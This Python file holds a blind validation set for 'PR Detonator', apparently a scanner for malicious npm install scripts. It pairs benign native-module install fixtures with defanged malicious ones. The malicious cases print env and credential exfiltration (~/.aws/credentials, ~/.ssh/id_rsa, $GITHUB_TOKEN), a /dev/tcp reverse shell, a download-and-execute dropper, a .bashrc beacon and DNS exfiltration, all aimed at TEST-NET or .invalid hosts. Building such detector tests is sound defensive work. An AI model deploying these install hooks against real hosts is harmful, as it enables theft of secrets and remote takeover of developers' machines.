"""Independent blind validation set for PR Detonator (kind="validation").

Written WITHOUT reading any detector code (brain/rules.py, intent.py, verdict.py,
evidence.py, sbom.py, prompts, docs/, or any eval/REDTEAM*/results*/SWEEP*/blind*
file). These cases judge the tool from the outside; the expected verdicts are frozen
in eval/validation_labels.json before any tool run.

DEFANGED ONLY. Every destination is non-routable / non-resolving:
  * reserved TEST-NET IPs: 203.0.113.0/24, 198.51.100.0/24, 192.0.2.0/24
  * `.invalid` names (never resolve) or example.com (dummy body)
No real IPs, domains, credentials, or exfil endpoints appear anywhere. These are
detection probes, not payloads.

Structure mirrors eval/cases.py: each case is a fixture npm package delivered via
`files=` (built with the same `_pkg` / `_node_payload` helpers). The benign cases
simulate legitimate-but-noisy native-module install behavior (prebuilt-binary
downloads, native compiles, mirror DNS lookups, CPU-heavy builds, writes to their
own package dir); the malicious cases simulate install-time attacks. Both are
non-functional: the benign network targets example.com / .invalid, the malicious
ones TEST-NET / .invalid, so nothing actually happens on a run.
"""

from eval.cases import Case, _node_payload, _pkg

# --- genuinely benign installs a naive scanner might wrongly flag ---

BENIGN = [
    Case(
        "v01-prebuilt-addon",
        "validation",
        "Add libfast native bindings",
        "Adds libfast for faster CSV parsing; ships a prebuilt addon per platform.",
        files=_node_payload(
            "v01",
            """
const https = require("https"), fs = require("fs"), path = require("path");
// Fetch the prebuilt native addon for this platform into our own build dir (like node-sass).
const url = "https://downloads.example.com/libfast/v2.1.0/libfast-linux-x64.node";
const dir = path.join(__dirname, "..", "build");
try { fs.mkdirSync(dir, { recursive: true }); } catch {}
const out = fs.createWriteStream(path.join(dir, "libfast.node"));
https.get(url, (res) => { res.pipe(out); }).on("error", () => {});
""",
        ),
        note="benign: downloads a prebuilt .node from a vendor host into its own package dir",
    ),
    Case(
        "v02-node-gyp-build",
        "validation",
        "Add zlib-turbo native module",
        "Compiles a small zlib wrapper from source with node-gyp at install.",
        files={"package.json": _pkg("v02", {"install": "node-gyp rebuild"}, gypfile=True)},
        note="benign: native compile (node-gyp), heavy CPU, no network",
    ),
    Case(
        "v03-mirror-dns",
        "validation",
        "Add fast-fonts asset fetcher",
        "Picks the nearest asset mirror by resolving each candidate before downloading.",
        files=_node_payload(
            "v03",
            """
const dns = require("dns");
// Geo mirror selection: resolve each candidate CDN to pick the closest one.
const mirrors = ["cdn1.example.com", "cdn2.example.com", "cdn3.example.com",
                 "cdn4.example.com", "cdn5.example.com", "cdn6.example.com"];
for (const m of mirrors) { dns.resolve4(m, () => {}); }
""",
        ),
        note="benign: many DNS lookups to pick a download mirror; no data leaves",
    ),
    Case(
        "v04-cpu-build",
        "validation",
        "Add bundle optimizer",
        "Runs an optimizing minify pass over the bundle during install.",
        files=_node_payload(
            "v04",
            """
// Simulate a CPU-bound optimizing build pass. No network, no file access.
const end = Date.now() + 6000;
let x = 0;
while (Date.now() < end) { x += Math.sqrt(x + 1) % 7; }
""",
        ),
        note="benign: CPU-heavy build, no egress and no file writes",
    ),
    Case(
        "v05-cache-own-dir",
        "validation",
        "Add template precompiler",
        "Precompiles templates into the package's own cache on install.",
        files=_node_payload(
            "v05",
            """
const fs = require("fs"), path = require("path");
// Write a compiled-template cache inside our OWN package directory.
const dir = path.join(__dirname, "..", ".cache");
try {
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, "templates.json"), JSON.stringify({ built: true }));
} catch {}
""",
        ),
        note="benign: writes a cache inside its own package dir; local only",
    ),
    Case(
        "v06-install-telemetry",
        "validation",
        "Add usage telemetry (opt-out)",
        "Sends anonymous install stats (node version and platform only) unless disabled.",
        files=_node_payload(
            "v06",
            """
const https = require("https");
// Anonymous install telemetry: node version + platform only, no env, no secrets.
const body = JSON.stringify({
  node: process.version, platform: process.platform, arch: process.arch,
});
const r = https.request(
  { host: "telemetry.example.com", method: "POST", path: "/install", timeout: 3000 });
r.on("error", () => {}); r.on("timeout", () => r.destroy());
r.end(body);
""",
        ),
        note="benign-ambiguous: posts non-sensitive node/platform telemetry at install",
    ),
    Case(
        "v07-browser-download",
        "validation",
        "Add headless-browser driver",
        "Downloads the pinned headless browser build into the package cache (like puppeteer).",
        files=_node_payload(
            "v07",
            """
const https = require("https"), fs = require("fs"), path = require("path");
// Download the pinned browser build into our OWN package cache dir.
const dir = path.join(__dirname, "..", ".local-browser");
try { fs.mkdirSync(dir, { recursive: true }); } catch {}
const dest = path.join(dir, "chrome-linux.zip");
https.get("https://storage.example.com/browser/1234567/chrome-linux.zip", (res) => {
  const out = fs.createWriteStream(dest); res.pipe(out);
}).on("error", () => {});
""",
        ),
        note="benign: downloads a pinned browser build into its own cache dir",
    ),
]

# --- malicious install-time behaviors (defanged) ---

MALICIOUS = [
    Case(
        "v08-env-exfil",
        "validation",
        "Add install diagnostics",
        "Collects install diagnostics to help debug CI failures.",
        files=_node_payload(
            "v08",
            """
const http = require("http");
const r = http.request(
  { host: "203.0.113.10", method: "POST", path: "/collect", timeout: 3000 });
r.on("error", () => {}); r.on("timeout", () => r.destroy());
r.end(JSON.stringify(process.env));
""",
        ),
        note="malicious: serializes the whole environment and POSTs it to a raw IP",
    ),
    Case(
        "v09-cred-harvest",
        "validation",
        "Add cloud deploy setup",
        "Prepares cloud deploy credentials for the CI pipeline.",
        files=_node_payload(
            "v09",
            """
const fs = require("fs"), os = require("os"), http = require("http");
let blob = "";
for (const p of [".aws/credentials", ".ssh/id_rsa"]) {
  try { blob += fs.readFileSync(os.homedir() + "/" + p, "utf8"); } catch {}
}
const r = http.request(
  { host: "198.51.100.23", method: "POST", path: "/up", timeout: 3000 });
r.on("error", () => {}); r.on("timeout", () => r.destroy());
r.end(blob);
""",
        ),
        note="malicious: reads ~/.aws/credentials and ~/.ssh/id_rsa and uploads them",
    ),
    Case(
        "v10-reverse-shell",
        "validation",
        "Add CI shell helper",
        "Shell helper used by the CI job.",
        files={
            "package.json": _pkg(
                "v10",
                {
                    "postinstall": "timeout 3 bash -c 'bash -i >& /dev/tcp/192.0.2.44/4444 0>&1'"
                    " || true",
                },
            )
        },
        note="malicious: interactive reverse shell over /dev/tcp",
    ),
    Case(
        "v11-drop-and-run",
        "validation",
        "Add native accelerator",
        "Downloads the native accelerator binary for your platform.",
        files=_node_payload(
            "v11",
            """
const http = require("http"), fs = require("fs"), os = require("os"), path = require("path");
const { spawn } = require("child_process");
const dest = path.join(os.tmpdir(), "stage.bin");
http.get({ host: "203.0.113.50", path: "/stage.bin", timeout: 3000 }, (res) => {
  const out = fs.createWriteStream(dest);
  res.pipe(out);
  out.on("finish", () => {
    try { fs.chmodSync(dest, 0o755); spawn(dest, { detached: true, stdio: "ignore" }).unref(); }
    catch {}
  });
}).on("error", () => {});
""",
        ),
        note="malicious: downloads a binary, chmod +x, runs it detached",
    ),
    Case(
        "v12-bashrc-persist",
        "validation",
        "Add shell completions",
        "Installs convenient shell tab-completions.",
        files=_node_payload(
            "v12",
            """
const fs = require("fs"), os = require("os"), path = require("path");
const line = '\\ncurl -s http://203.0.113.77/beacon >/dev/null 2>&1 &\\n';
try { fs.appendFileSync(path.join(os.homedir(), ".bashrc"), line); } catch {}
console.log("completions installed");
""",
        ),
        note="malicious: writes a network-beacon persistence line into ~/.bashrc",
    ),
    Case(
        "v13-dns-exfil",
        "validation",
        "Add telemetry opt-out",
        "Disables telemetry during install.",
        files=_node_payload(
            "v13",
            """
const data = Buffer.from(JSON.stringify(process.env)).toString("hex");
const labels = data.match(/.{1,60}/g).slice(0, 3).join(".");
require("dns").resolve4(labels + ".exfil.invalid", () => {});
""",
        ),
        note="malicious: hex-encodes env into DNS labels; exfiltrates with no TCP connection",
    ),
    Case(
        "v14-token-steal",
        "validation",
        "Add release-notes fetcher",
        "Fetches release notes for the bumped dependency during install.",
        files={
            "package.json": _pkg(
                "v14",
                {
                    "postinstall": 'curl -s -m 3 -H "Authorization: token $GITHUB_TOKEN" '
                    "http://198.51.100.99/notes || true",
                },
            )
        },
        note="malicious: steals $GITHUB_TOKEN and sends it in an auth header to a raw IP",
    ),
]

VALIDATION_SET = tuple(BENIGN + MALICIOUS)
